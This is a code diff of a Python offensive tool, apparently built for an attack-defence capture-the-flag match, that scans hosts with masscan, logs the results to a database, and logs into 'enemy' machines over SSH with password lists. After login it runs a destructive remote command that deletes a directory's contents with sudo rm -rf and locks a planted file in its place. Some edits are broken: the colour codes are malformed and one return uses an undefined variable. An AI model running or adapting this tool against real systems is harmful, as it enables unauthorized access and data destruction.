@@ -32,6 +32,7 @@ def TurnOn():
     parser.add_argument('-c', '--change', dest='change', action='store_true', help='whether change pwd')
     parser.add_argument('-u', '--usernames', dest='usernames', nargs='+', help='user list')
     parser.add_argument('-m', '--masscan-result', dest='mass_file', help='masscan result file, the fomat of the content must be `-oL`\'d')
+    parser.add_argument('--pwd_file', dest='pwd_file', help='password file')
 
     commands = parser.parse_args()
     return commands
@@ -60,9 +61,9 @@ async def run(command, loop=None):
         informations['names'].add(process.pid)
         out_buf, err_buf = await process.communicate()
     except UnsupportedOperation:
-        print('[-] output file must be a opened file in \'w\' mode')
+        print('\033[0;31[-] output file must be a opened file in \'w\' mode\033[31m')
     except FileNotFoundError:
-        print('[-] you\'d best install masscan first')
+        print('\033[0;31[-] you\'d best install masscan first\033[31m')
 
     return out_buf
 
@@ -95,12 +96,20 @@ def resharp_results(sshed, pinged):
     for x in pinged:
         results[x] = ['ssh', 'ping'] if results.get(x) else ['ping']
 
+    if db:
+        coll = db['alive']
+        for k,v in results.items():
+            try:
+                coll.insert({'ip': k,
+                             'ssh': 'open' if 'ssh' in v else 'close',
+                             'ping': 'open' if 'ping' in v else 'close'})
+            except Exception as e:
+                print(f'\033[0;31[-]  Error:  {e}\033[31m')
     return results
 
 
-async def change_enemy(enemy, names, old_pwd, new_pwd):
+async def change_enemy(enemy, names, old_pwd, new_pwd='hydra'):
     assert(isinstance(names, list) and isinstance(old_pwd, list))
-    status = 0
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     for name in names:
@@ -113,15 +122,26 @@ async def change_enemy(enemy, names, old_pwd, new_pwd):
 
                # payload1 = f"echo '{name}:{new_pwd}' | chpasswd"
                # std_in, std_out, std_err = ssh_client.exec_command(payload1)
-                get_score = "sudo rm -rf /Kronos/* && echo 'hail hydra' | sudo tee /Kronos/hydra && sudo chown -R root /Kronos && sudo chmod 444 /Kronos"
+                get_score = "sudo rm -rf /Kronos/* && echo 'hail hydra' | sudo tee /Kronos/fortytwo && sudo chown -R root /Kronos && sudo chmod 444 /Kronos"
                 ssh_client.exec_command(get_score)
                 ssh_client.close()
             except paramiko.AuthenticationException:
-                print(f'[-] wrong old pwd for user <{name}> at <{enemy}>')
+                print(f'\033[0;31[-] wrong old pwd for user <{name}> at <{enemy}>\033[31m')
             else:
-                status = 1
-    return status
+                break
+    return enemy, old, new_pwd
 
+def create_actions(ips, names, pwds=None, new_pwd=None):
+    return [change_enemy(ip, names, pwds) for ip in ips]
+
+def save_results(type_, results):
+    if db:
+        coll = db[type_]
+        for result in results:
+            try:
+                coll.insert(result)
+            except Exception as e:
+                print(f'\033[0;31[-]  Error:  {e}\033[31m')
 
 def kill_all(lives):
     for name in informations['names']:
@@ -134,4 +154,4 @@ def kill_all(lives):
                     killed = 1
                     break
                 except BaseException as e:
-                    print(f'[-] {e}')
+                    print(f'\033[0;31[-] {e}\033[31m')
